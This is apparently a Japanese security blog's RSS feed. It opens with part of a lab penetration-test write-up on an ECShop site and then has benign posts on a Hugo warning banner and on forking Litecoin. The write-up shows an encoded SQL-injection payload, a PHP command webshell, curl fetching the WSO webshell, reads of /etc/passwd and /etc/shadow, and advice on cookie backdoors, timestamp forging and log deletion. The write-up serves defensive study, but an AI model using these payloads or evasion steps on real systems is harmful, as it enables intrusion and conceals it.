&lt;p&gt;WSO(Web Shell by oRb)は有名な多機能php webshell実装で、ベストセラーです。&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;GET /cmd.php?cmd=curl%20-o%20wso.php%20https://raw.githubusercontent.com/tennc/webshell/master/php/wso/wso-4.2.5.php HTTP/1.1
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;em&gt;上記のgithubに置かれているwsoの管理者パスワードはadminです。&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;※本当にただのWSOなのか怪しい所があるので、検証時の取扱には気をつけてください。&lt;/p&gt;
&lt;br/&gt;
&lt;figure&gt;&lt;img src=&#34;./website_wso.png&#34;
         alt=&#34;WSOのコンソール&#34;/&gt;&lt;figcaption&gt;
            &lt;p&gt;WSOのコンソール&lt;/p&gt;
        &lt;/figcaption&gt;
&lt;/figure&gt;

&lt;br/&gt;
だいぶ便利になりました。
&lt;p&gt;次はこのサーバからAD環境へ侵害を広げていく予定です。&lt;/p&gt;
&lt;hr&gt;
&lt;h1 id=&#34;攻撃の痕跡&#34;&gt;攻撃の痕跡&lt;/h1&gt;
&lt;h2 id=&#34;idsの検知&#34;&gt;IDSの検知&lt;/h2&gt;
&lt;p&gt;Suricataのログを確認しましたが、Exploitには全く反応がありませんでした。&lt;br&gt;
それっぽいの&amp;quot;SELECT 1,&amp;ldquo;と&amp;quot;UNION&amp;quot;だけなので厳しいかもしれませんね。&lt;/p&gt;
&lt;p&gt;&lt;del&gt;ただWSOの設置周りで通信を1件だけ検知してくれていました。&lt;/del&gt;&lt;br&gt;
&lt;font color=&#34;Crimson&#34;&gt;
(2019/05/11 追記)&lt;br&gt;
すいません。バックドア周りで色々検知してくれました。(Exploitは相変わらず反応なし)&lt;br&gt;
OPNSenseが設定を更新するときsuricata.yamlをデフォに戻すようで、HOME_NET周りの設定が全部飛んでしまっていたようです。&lt;br&gt;
今はOPNSenseのコードを変えて設定を維持するようにしたので改善済みです。
&lt;/font&gt;&lt;/p&gt;
&lt;p&gt;minimal backdoorのOSコマンド、WSOログイン時レスポンスではちゃんと検知してくれました。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;ET WEB_SERVER Exploit Suspected PHP Injection Attack (cmd=)&lt;br&gt;
-&amp;gt; minimal backdoorのパラメータ名をcmdにしたため検知してくれました。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;ET ATTACK_RESPONSE WSO - WebShell Activity - WSO Title&lt;br&gt;
-&amp;gt; WSOのトップ画面のソースコードで検知してくれました。&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;(2019/05/11 追記終わり)&lt;/p&gt;
&lt;h2 id=&#34;アクセスログ&#34;&gt;アクセスログ&lt;/h2&gt;
&lt;h3 id=&#34;exploitation&#34;&gt;Exploitation&lt;/h3&gt;
&lt;p&gt;この脆弱性を突く攻撃は、Refererにペイロードが入るちょっと珍しいものです。&lt;br&gt;
一般的なログフォーマットならRefererは記録されるため、攻撃内容がログに残ります。&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;192.168.2.22 - - [10/May/2019:19:59:27 +0000] &amp;#34;GET /user.php?act=login HTTP/1.1&amp;#34; 200 10660 &amp;#34;554fcae493e564ee0dc75bdf2ebf94caads|a:2:{s:3:\&amp;#34;num\&amp;#34;;s:305:\&amp;#34;*/SELECT 1,0x2d312720554e494f4e2f2a,2,4,5,6,7,8,0x7b24617364275d3b617373657274286261736536345f6465636f646528225a6d6c735a56397764585266593239756447567564484d6f4a324e745a4335776148416e4c4363385033426f6343427759584e7a644768796453676b58306446564673695932316b496c30704f79412f506963702229293b2f2f7d787878,10-- -\&amp;#34;;s:2:\&amp;#34;id\&amp;#34;;s:11:\&amp;#34;-1&amp;#39; UNION/*\&amp;#34;;}554fcae493e564ee0dc75bdf2ebf94ca&amp;#34; &amp;#34;-&amp;#34;
&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;minimal-backdoor&#34;&gt;minimal backdoor&lt;/h3&gt;
&lt;p&gt;適当に作ったクソザコなwebshellなので、コマンド実行の処理は「passthru(_$GET[&amp;ldquo;cmd&amp;rdquo;])」 になっています。&lt;/p&gt;
&lt;p&gt;なので実行したコマンドがアクセスログのクエリストリング部に完全に残ります。&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;192.168.2.22 - - [10/May/2019:20:00:05 +0000] &amp;#34;GET /cmd.php?cmd=whoami HTTP/1.1&amp;#34; 200 186 &amp;#34;-&amp;#34; &amp;#34;-&amp;#34;
192.168.2.22 - - [10/May/2019:20:00:10 +0000] &amp;#34;GET /cmd.php?cmd=w HTTP/1.1&amp;#34; 200 341 &amp;#34;-&amp;#34; &amp;#34;-&amp;#34;
192.168.2.22 - - [10/May/2019:20:00:26 +0000] &amp;#34;GET /cmd.php?cmd=uname%20-a HTTP/1.1&amp;#34; 200 299 &amp;#34;-&amp;#34; &amp;#34;-&amp;#34;
192.168.2.22 - - [10/May/2019:20:00:38 +0000] &amp;#34;GET /cmd.php?cmd=ip%20a HTTP/1.1&amp;#34; 200 692 &amp;#34;-&amp;#34; &amp;#34;-&amp;#34;
192.168.2.22 - - [10/May/2019:20:01:14 +0000] &amp;#34;GET /cmd.php?cmd=curl%20https://www.shutingrz.com/ HTTP/1.1&amp;#34; 200 25755 &amp;#34;-&amp;#34; &amp;#34;-&amp;#34;
192.168.2.22 - - [10/May/2019:20:02:23 +0000] &amp;#34;GET /cmd.php?cmd=cat%20/etc/passwd HTTP/1.1&amp;#34; 200 1400 &amp;#34;-&amp;#34; &amp;#34;-&amp;#34;
192.168.2.22 - - [10/May/2019:20:02:33 +0000] &amp;#34;GET /cmd.php?cmd=cat%20/etc/shadow HTTP/1.1&amp;#34; 200 177 &amp;#34;-&amp;#34; &amp;#34;-&amp;#34;
192.168.2.22 - - [10/May/2019:20:03:16 +0000] &amp;#34;GET /cmd.php?cmd=curl%20-o%20wso.php%20https://raw.githubusercontent.com/tennc/webshell/master/php/wso/wso-4.2.5.php HTTP/1.1&amp;#34; 200 177 &amp;#34;-&amp;#34; &amp;#34;-&amp;#34;
&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;wso&#34;&gt;WSO&lt;/h3&gt;
&lt;p&gt;ファイル名が特徴的（自業自得ですが）なものの、ペイロードはPOSTデータ部に入るので何が行われたかはわかりません。&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;192.168.2.22 - - [10/May/2019:20:04:06 +0000] &amp;#34;GET /wso.php HTTP/1.1&amp;#34; 200 478 &amp;#34;-&amp;#34; &amp;#34;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.75 Safari/537.36&amp;#34;
192.168.2.22 - - [10/May/2019:20:04:10 +0000] &amp;#34;POST /wso.php HTTP/1.1&amp;#34; 200 8099 &amp;#34;http://192.168.2.24/wso.php&amp;#34; &amp;#34;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.75 Safari/537.36&amp;#34;
192.168.2.22 - - [10/May/2019:20:04:10 +0000] &amp;#34;GET /wso.php HTTP/1.1&amp;#34; 200 8020 &amp;#34;http://192.168.2.24/wso.php&amp;#34; &amp;#34;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.75 Safari/537.36&amp;#34;
192.168.2.22 - - [10/May/2019:20:04:27 +0000] &amp;#34;POST /wso.php HTTP/1.1&amp;#34; 200 5370 &amp;#34;http://192.168.2.24/wso.php&amp;#34; &amp;#34;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.75 Safari/537.36&amp;#34;
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;エラーログ&#34;&gt;エラーログ&lt;/h2&gt;
&lt;p&gt;cmd.phpで2回curlを実行した際のプログレス表示が残っていました。&lt;/p&gt;
&lt;p&gt;また、/etc/shadowの閲覧失敗エラーが残っていました。&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed

  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0
  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0
  0     0    0     0    0     0      0      0 --:--:--  0:00:01 --:--:--     0
100 25510  100 25510    0     0  16413      0  0:00:01  0:00:01 --:--:-- 16405
cat: /etc/shadow: Permission denied
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed

  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0
  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0
  0     0    0     0    0     0      0      0 --:--:--  0:00:01 --:--:--     0
  2 79753    2  1917    0     0    865      0  0:01:32  0:00:02  0:01:30   865
100 79753  100 79753    0     0  35753      0  0:00:02  0:00:02 --:--:-- 35747
sh: 1: -t: not found
&lt;/code&gt;&lt;/pre&gt;&lt;hr&gt;
&lt;h1 id=&#34;検知回避痕跡抹消へのアクション&#34;&gt;検知回避・痕跡抹消へのアクション&lt;/h1&gt;
&lt;p&gt;だいぶ自由に暴れたので、痕跡がいっぱい残っていますね。&lt;br&gt;
以下を行えば痕跡は残りにくそうです。&lt;br&gt;
&lt;br/&gt;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;初期侵入のためのバックドアはreverse tcp にする
&lt;ul&gt;
&lt;li&gt;ただreverse tcpだと永続化にはならないので何らかの永続化手段が必要&lt;/li&gt;
&lt;li&gt;普通にbashとかを平文で流すとOSコマンド次第で検知されそうなので、ncとかがあればmeterpreterを注入すればよさそう 
&lt;br/&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;index.php(ECShopそのもの)に永続化用のバックドアを仕込む。
&lt;ul&gt;
&lt;li&gt;途中で assert(gzinflate(base64_decode(_COOKIE[&amp;ldquo;q&amp;rdquo;]))) みたいなコード混ぜれば良さそう。&lt;/li&gt;
&lt;li&gt;Cookieならアクセスログにも残らないし、IDSによってはセレクタ的にPOSTデータより甘そう。&lt;/li&gt;
&lt;li&gt;仕込んだあとは一気に他のファイルもまとめてtouchし、ファイルスタンプを揃えておく。&lt;/li&gt;
&lt;li&gt;このアプローチなら少なくともアプリケーションがアップデートされるまでは有効。
より長く侵害したければ、cronとか、一か八かでユーザの.loginにダウンローダを仕込むとか？&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;curl は -s オプションをつけろ。&lt;/li&gt;
&lt;li&gt;アクセスログ、エラーログから痕跡を削除しておく
&lt;ul&gt;
&lt;li&gt;アクセスログはsedで送信元IPアドレス単位でまとめて削除するといいかも。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;hr&gt;
&lt;p&gt;ブルーチームは上記アクションの対抗策を考えないといけないですね。運用負荷が・・・。&lt;/p&gt;
&lt;font color=&#34;Crimson&#34;&gt;
(2019/05/13 追記)  
続きの記事を書きました。  
&lt;/font&gt;
[ペネトレ検証-権限昇格とWildcard Injectionの原理](/post/ad_hack-linux_priv_escalation/)
&lt;br/&gt;
以上。
</description>
      <image>
        <url>https://www.shutingrz.com/cover.png</url>
        <title>ペネトレ検証-ECサイトに侵入</title>
        <link>https://www.shutingrz.com/post/ad_hack-ec_exploit/</link>
      </image>
    </item>
    
    
    

    
    <item>
      <title>記事に特定のタグがあったら「悪用禁止」と表示されるようにしてみた</title>
      <link>https://www.shutingrz.com/post/hugo-notice-banner/</link>
      <pubDate>Wed, 08 May 2019 02:43:52 +0900</pubDate>
      
      <guid>https://www.shutingrz.com/post/hugo-notice-banner/</guid>
      <description>&lt;p&gt;要はGDPR対応用のライブラリを「悪用禁止」の意思表示に使うってだけの話です。&lt;br&gt;
記事に特定のタグ(本Webサイトではethical_hacking)があったらバナーが出るようになっています。&lt;br&gt;
※この記事はハッキングには関係ありませんが、デモ用に表示が出るようにしています。&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;一応情報公開のスタンスをここに書いておきます。&lt;/p&gt;
&lt;h2 id=&#34;セキュリティ情報の公開について&#34;&gt;セキュリティ情報の公開について&lt;/h2&gt;
&lt;p&gt;セキュリティ情報を広く公開することは大事です。&lt;br&gt;
最近は色々あったせいか、セキュリティ情報を共有する方が減りました。&lt;br&gt;
特に使用者の意思によって悪用も可能になるハッキング技術(Exploit・Pentest・Anti Analysisなど)については、
勉強会が縮小したりブログを非公開にされる方が出るなど、惨憺たるものです。&lt;/p&gt;
&lt;p&gt;ただこうやってセキュリティエンジニアが萎縮して結局得するのは攻撃者側だと思っているので（私自身の考えです）、これからも恐れることなくセキュリティ情報を発信していくつもりです。&lt;/p&gt;
&lt;h2 id=&#34;意思表示&#34;&gt;意思表示&lt;/h2&gt;
&lt;p&gt;セキュリティ情報を公開するにしても、内容によっては当局にあらぬ疑いをかけられる可能が大いにあります。&lt;/p&gt;
&lt;p&gt;ちゃんと情報公開の意図を閲覧者に伝えるために、記事内には「悪用禁止」など明確に意思を伝えないといけません。&lt;/p&gt;
&lt;p&gt;そんな意思を伝えるのに、よくWebページの下に出てくるGDPR 用の表示がちょうどいいんじゃと思ったので使ってみることにしました。&lt;/p&gt;
&lt;p&gt;ただブログにはセキュリティ情報以外の内容も投稿しますし、セキュリティについても悪用とは無縁な情報もあります。
なので、記事に特定のタグがあるときにだけ表示するようにしてみました。&lt;/p&gt;
&lt;p&gt;※これはGDPR 対応用のものなので、一度同意したらクッキーが入り、クッキーが残っている限りは再度の表示はされません。&lt;/p&gt;
&lt;p&gt;本ブログは Hugo で構築しているので、Hugo 向けの話になります。&lt;/p&gt;
&lt;hr&gt;
&lt;h1 id=&#34;作成手順&#34;&gt;作成手順&lt;/h1&gt;
&lt;h1 id=&#34;cookie-consent-でメッセージを作る&#34;&gt;Cookie Consent でメッセージを作る&lt;/h1&gt;
&lt;p&gt;Cookie Consent という、MITライセンスの素晴らしいGDPR対応用のコードがあります。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;a href=&#34;https://cookieconsent.insites.com/&#34;&gt;https://cookieconsent.insites.com/&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Download リンクをクリックすればバナーの作成画面に移ります。&lt;/p&gt;
&lt;figure&gt;&lt;img src=&#34;./cookie-consent.png&#34;
         alt=&#34;バナー作成画面&#34;/&gt;&lt;figcaption&gt;
            &lt;p&gt;バナー作成画面&lt;/p&gt;
        &lt;/figcaption&gt;
&lt;/figure&gt;

&lt;p&gt;説明通りに作っていけば下のレビュー用バナーがいい感じに変わっていき、設定に合わせたコードが右画面に出ます。&lt;br&gt;
悩みどころは 5. Compliance type ですが、今回はGDPRとは関係ないので一番上の「Just tell users that we use cookies」でいいです。&lt;br&gt;
設定し終わったら右部のコードをどこかに控えておきます。&lt;/p&gt;
&lt;p&gt;※Hugoじゃない方は、右部のコード変えていい感じに使えばいいと思います。&lt;/p&gt;
&lt;h2 id=&#34;表示対象のタグを設定する&#34;&gt;表示対象のタグを設定する&lt;/h2&gt;
&lt;p&gt;Hugo の config ファイル(私の場合はconfig.toml)のParamsディレクティブにnoticeTagを追加します。&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;[Params]
noticeTag = &amp;#34;ethical_hacking&amp;#34;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;ここで設定したタグがHugoの記事に設定されているとバナーが出るようになります。&lt;/p&gt;
&lt;h2 id=&#34;使っているテーマのfooterあたりにマクロを入れる&#34;&gt;使っているテーマのfooterあたりにマクロを入れる&lt;/h2&gt;
&lt;p&gt;ここは適当に自分の使ってるテーマに合わせて設定してください。
私は Beautifulhugo を使っているので、「layouts/partials/footer.html」の最初に仕込みました。&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;  {{ if .Params.tags }}
    {{ range .Params.tags }}
      {{ if eq . $.Site.Params.noticeTag }}
      &amp;lt;!-- ここに Cookie Consent のコードを入れる --&amp;gt;
      {{ end }}
    {{ end }}
  {{ end }}
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;私はfooter.htmlの最初に仕込んだので、以下のようになりました。&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;&amp;lt;footer&amp;gt;
  {{ if .Params.tags }}
    {{ range .Params.tags }}
      {{ if eq . $.Site.Params.noticeTag }}
  &amp;lt;link rel=&amp;#34;stylesheet&amp;#34; type=&amp;#34;text/css&amp;#34; href=&amp;#34;//cdnjs.cloudflare.com/ajax/libs/cookieconsent2/3.1.0/cookieconsent.min.css&amp;#34; /&amp;gt;
  &amp;lt;script src=&amp;#34;//cdnjs.cloudflare.com/ajax/libs/cookieconsent2/3.1.0/cookieconsent.min.js&amp;#34;&amp;gt;&amp;lt;/script&amp;gt;
  &amp;lt;script&amp;gt;
    window.addEventListener(&amp;#34;load&amp;#34;, function(){
    window.cookieconsent.initialise({
      &amp;#34;palette&amp;#34;: {
        &amp;#34;popup&amp;#34;: {
          &amp;#34;background&amp;#34;: &amp;#34;#000&amp;#34;
        },
        &amp;#34;button&amp;#34;: {
          &amp;#34;background&amp;#34;: &amp;#34;#f1d600&amp;#34;
        }
      },
      &amp;#34;content&amp;#34;: {
        &amp;#34;message&amp;#34;: &amp;#34;本ページはサイバー空間の安心・安全な環境を確保する目的で公開
しています。ここで知り得た情報は決して悪用しないでください。&amp;#34;,
        &amp;#34;dismiss&amp;#34;: &amp;#34;OK&amp;#34;,
        &amp;#34;href&amp;#34;: &amp;#34;/pages/about-disclosure-security-information/&amp;#34;
      }
    })});
  &amp;lt;/script&amp;gt;
      {{ end }}
    {{ end }}
  {{ end }}

  &amp;lt;div class=&amp;#34;container&amp;#34;&amp;gt;
(snip)
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;これでもう一度静的ページをビルドすれば特定のタグが設定されているときだけバナーが出るようになります。&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;これでうまく意思が伝わればいいけど・・・。&lt;/p&gt;
</description>
      <image>
        <url>https://www.shutingrz.com/cover.png</url>
        <title>記事に特定のタグがあったら「悪用禁止」と表示されるようにしてみた</title>
        <link>https://www.shutingrz.com/post/hugo-notice-banner/</link>
      </image>
    </item>
    
    
    

    
    <item>
      <title>自作仮想通貨入門(10) - 著作権表示の記載・おわりに</title>
      <link>https://www.shutingrz.com/post/oreore-coin10/</link>
      <pubDate>Mon, 29 Apr 2019 23:19:55 +0900</pubDate>
      
      <guid>https://www.shutingrz.com/post/oreore-coin10/</guid>
      <description>&lt;p&gt;この章で自作仮想通貨入門は終わりです。&lt;br&gt;
著作権表示をしてあなたの仮想通貨をアピールしましょう。&lt;/p&gt;
&lt;hr&gt;
&lt;h2 id=&#34;著作権表示の記載&#34;&gt;著作権表示の記載&lt;/h2&gt;
&lt;p&gt;著作権表示は下記のファイルに記載します。&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;./COPYING
./doc/man/raccoin-cli.1
./doc/man/raccoin-qt.1
./doc/man/raccoin-tx.1
./doc/man/raccoind.1
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;例えばRaccoinなら以下のようにします。&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;Copyright (C) 2018 The Raccoin Core developers
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;記載箇所については&amp;quot;Litecoin&amp;quot;で検索して確認してください。&lt;br&gt;
フォーク元(BitcoinとLitecoin)の著作権表示を残しつつ、自分の仮想通貨の著作権表示を追記する感じです。&lt;/p&gt;
&lt;hr&gt;
&lt;h1 id=&#34;追記-重要-cve-2018-17144-の対策&#34;&gt;[追記] 重要: CVE-2018-17144 の対策&lt;/h1&gt;
&lt;p&gt;今回、自作仮想通貨のもととして利用するソースコードは Litecoin 0.16 です。
Litecoin 0.16 のもとである BitcoinCore 0.16 には CVE-2018-17144 の脆弱性が存在し、このまま利用すると通貨が不正増殖される恐れがあります。&lt;/p&gt;
&lt;p&gt;この脆弱性を修正するため、&amp;ldquo;src/validation.cpp&amp;rdquo; の 3003 行目を以下のように変更してください。&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;-        if (!CheckTransaction(*tx, state, false))
+        if (!CheckTransaction(*tx, state, true))
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;false を true にするだけです。&lt;/p&gt;
&lt;hr&gt;
&lt;h1 id=&#34;おわりに&#34;&gt;おわりに&lt;/h1&gt;
&lt;p&gt;お疲れ様です！&lt;br&gt;
ここまで終われば「自作仮想通貨入門(2) - Litecoinの準備」で行ったコンパイルをもう一度行うだけで、あなただけの仮想通貨ができあがります。&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://www.shutingrz.com/post/oreore-coin2/&#34;&gt;自作仮想通貨入門(2) - Litecoinの準備&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;自作仮想通貨入門はここまでですが、本格的に仮想通貨を運用しようとなるとやることがいっぱいあります。&lt;/p&gt;
&lt;h2 id=&#34;仮想通貨の新規公開のためにやるべきことリスト&#34;&gt;仮想通貨の新規公開のためにやるべきことリスト&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;アイコンの作成&lt;/li&gt;
&lt;li&gt;readmeなどdocディレクトリ以下の整備&lt;/li&gt;
&lt;li&gt;シードリストの公開とソースコードへの記載
&lt;ul&gt;
&lt;li&gt;初期シーダの発見のためにはソースコードへのシーダ情報の記載が必要です。&lt;br&gt;
またdnsseedも運用するとよいでしょう&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;採掘アルゴリズムの検討
&lt;ul&gt;
&lt;li&gt;ここで作成した仮想通貨はLitecoinがもとになっているので、採掘アルゴリズムはScryptになっています。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;ソースコードの公開(Github等)&lt;/li&gt;
&lt;li&gt;ポータルサイトの開設・運営&lt;/li&gt;
&lt;li&gt;コミュニティサイトの開設・運営&lt;/li&gt;
&lt;li&gt;必要であれば開発者メンバーの引き入れ
&lt;ul&gt;
&lt;li&gt;複数人で開発する場合はビルド環境の整備（Gitianなど)もするとよいです。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;ホワイトペーパーの作成と公開(新技術がないと相手にされませんが・・・。)&lt;/li&gt;
&lt;/ul&gt;
&lt;hr&gt;
&lt;p&gt;楽しい自作仮想通貨ライフを送ってください！&lt;/p&gt;
</description>
      <image>
        <url>https://www.shutingrz.com/cover.png</url>
        <title>自作仮想通貨入門(10) - 著作権表示の記載・おわりに</title>
        <link>https://www.shutingrz.com/post/oreore-coin10/</link>
      </image>
    </item>
    
    
    

    
    <item>
      <title>自作仮想通貨入門(9) - ブロックデータのマジックバイト変更</title>
      <link>https://www.shutingrz.com/post/oreore-coin9/</link>
      <pubDate>Mon, 29 Apr 2019 22:52:33 +0900</pubDate>
      
      <guid>https://www.shutingrz.com/post/oreore-coin9/</guid>
      <description>&lt;p&gt;※この章では src/chainparams.cpp を変更します。&lt;/p&gt;
&lt;p&gt;あまり話題にならないものの仮想通貨では極めて重要な、ブロックデータのマジックバイトを変更します。&lt;/p&gt;
&lt;p&gt;ビットコインプロトコルにはブロックに関するデータを含みますが、そのデータを示すためのマジックバイトが存在します。
それが以下の記載です。&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;        pchMessageStart[0] = 0xfb;
        pchMessageStart[1] = 0xc0;
        pchMessageStart[2] = 0xb6;
        pchMessageStart[3] = 0xdb;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;このデータは誤って文字として解釈されないように、ASCII でも UTF-8 でも定義されていない適当な32bitの値になっています。&lt;br&gt;
この値はLitecoinのブロックのプレフィックスになるので、自作仮想通貨のメッセージであることを示せるように数値を少し変える必要があります。&lt;/p&gt;
&lt;p&gt;変更する際は、そのバイトがASCII でも UTF-8 でも定義されていない適当な32bitの値であるかどうか、また他の仮想通貨のマジックバイトと被っていないかを確認しておいてください。&lt;/p&gt;
&lt;p&gt;なお中途半端に移植されたアルトコインはしばしばこの値がLitecoinと同様になっているようです。&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;These are the magic bytes. They serve a variety of purposes, including indicating the proper network, and serving as a start for explorers such as Abe to parse. Some altcoins that don&amp;#39;t change the magic bytes (n00b launches) have problems such as trying to download the litecoin blockchain on start.

As for what &amp;#34;pchMessage&amp;#34; means exactly, I don&amp;#39;t know.

For more info, see http://james.lab6.com/2012/01/12/bitcoin-285-bytes-that-changed-the-world/
&lt;/code&gt;&lt;/pre&gt;&lt;blockquote&gt;
&lt;p&gt;&lt;a href=&#34;https://bitcointalk.org/index.php?topic=445508.0&#34;&gt;https://bitcointalk.org/index.php?topic=445508.0&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;この値が他の仮想通貨のマジックバイトと同一であれば、仮想通貨同士の見分けがつかず別の仮想通貨のノードと衝突を起こすかもしれません。&lt;br&gt;
ただ各仮想通貨でだいたいポート番号が異なっているため問題が表にでることは少ないと思いますが・・・。&lt;/p&gt;
&lt;h1 id=&#34;ソースコードの変更作業&#34;&gt;ソースコードの変更作業&lt;/h1&gt;
&lt;h2 id=&#34;mainnet&#34;&gt;Mainnet&lt;/h2&gt;
&lt;p&gt;pchMessageStart[1]を 0xc5 に変えることにします。&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;        pchMessageStart[0] = 0xfb;
        pchMessageStart[1] = 0xc5;
        pchMessageStart[2] = 0xb6;
        pchMessageStart[3] = 0xdb;
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;testnet&#34;&gt;Testnet&lt;/h2&gt;
&lt;p&gt;pchMessageStart[1]を 0xc6 に変えることにします。&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;        pchMessageStart[0] = 0xfb;
        pchMessageStart[1] = 0xc6;
        pchMessageStart[2] = 0xb6;
        pchMessageStart[3] = 0xdb;
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;regtest&#34;&gt;Regtest&lt;/h2&gt;
&lt;p&gt;pchMessageStart[1]を 0xc7 に変えることにします。&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;        pchMessageStart[0] = 0xfb;
        pchMessageStart[1] = 0xc7;
        pchMessageStart[2] = 0xb6;
        pchMessageStart[3] = 0xdb;
&lt;/code&gt;&lt;/pre&gt;&lt;hr&gt;
&lt;p&gt;以上でソースコードの変更は終わりです。
ここまでの作業を振り返るとわかるとおり、自作仮想通貨を作成するために必要な変更作業って実はchainparams.cppの変更で殆どが済んでしまうんです。&lt;br&gt;
BitcoinCoreがいかにコード的に洗練されているかがわかりますね。&lt;/p&gt;
&lt;p&gt;最後の章は著作権表示の記載です。&lt;/p&gt;
</description>
      <image>
        <url>https://www.shutingrz.com/cover.png</url>
        <title>自作仮想通貨入門(9) - ブロックデータのマジックバイト変更</title>
        <link>https://www.shutingrz.com/post/oreore-coin9/</link>
      </image>
    </item>
    
    
    

    
    <item>
      <title>自作仮想通貨入門(8) - アドレスのプレフィックス変更</title>
      <link>https://www.shutingrz.com/post/oreore-coin8/</link>
      <pubDate>Mon, 29 Apr 2019 00:45:29 +0900</pubDate>
      
      <guid>https://www.shutingrz.com/post/oreore-coin8/</guid>
      <description>&lt;p&gt;※この章では src/chainparams.cpp を変更します。&lt;/p&gt;
&lt;p&gt;仮想通貨の花形的存在、ウォレットアドレスについての説明とソースコードの変更をしていきます。&lt;/p&gt;
&lt;h2 id=&#34;プレフィックスの仕組みについて&#34;&gt;プレフィックスの仕組みについて&lt;/h2&gt;
&lt;p&gt;Litecoinではアドレスの1文字目に必ず&amp;quot;L&amp;quot;が入ります。このようにアドレスの1文字目に何らかのプレフィックスがつく仕様は、bitcoinの実装に由来するものです。&lt;br&gt;
bitcoinでは各種管理情報(ウォレットの秘密鍵や公開鍵など)の視認性をあげるためにデータをハッシュ化したのちBase58エンコードを行います。&lt;br&gt;
また、Base58エンコード前に、タイプミスによる事故の発生を防ぐ目的でチェックサムをつけています。&lt;br&gt;
これらの一連の処理を base58Check と呼びますが、base58Check にはヘッダを付与することでアドレスの種類を仕分けることが可能になっています。&lt;br&gt;
技術的詳細については下記URLを参照してください。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;a href=&#34;https://en.bitcoin.it/wiki/List_of_address_prefixes&#34;&gt;https://en.bitcoin.it/wiki/List_of_address_prefixes&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;初期のbitcoinはビットコインアドレス(P2PKHアドレス)を生成するとき、 アドレスが必ず&amp;quot;1&amp;quot;から始まっていました。&lt;br&gt;
なお、今回の仮想通貨の基となるLitecoinはP2PKHアドレスが必ず&amp;quot;L&amp;quot;で始まります。&lt;br&gt;
これは下記コードで指定することで実現しています。&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;base58Prefixes[PUBKEY_ADDRESS] = std::vector&amp;lt;unsigned char&amp;gt;(1,48);
